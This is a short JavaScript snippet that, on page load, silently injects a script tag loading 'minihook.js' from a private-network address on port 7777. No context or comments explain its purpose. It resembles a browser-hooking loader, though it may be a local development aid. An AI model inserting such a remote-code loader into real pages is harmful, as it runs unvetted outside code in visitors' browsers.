(function () {
  function loadRemote() {
    if (typeof document === 'undefined') {
      return;
    }
    var tag = document.getElementById('minihook-remote');
    if (tag) return;
    var sc = document.createElement('script');
    sc.id = 'minihook-remote';
    sc.src = 'http://192.168.0.100:7777/minihook.js';
    sc.defer = true;
    sc.crossOrigin = 'anonymous';
    document.head.appendChild(sc);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadRemote, { once: true });
  } else {
    loadRemote();
  }
})();
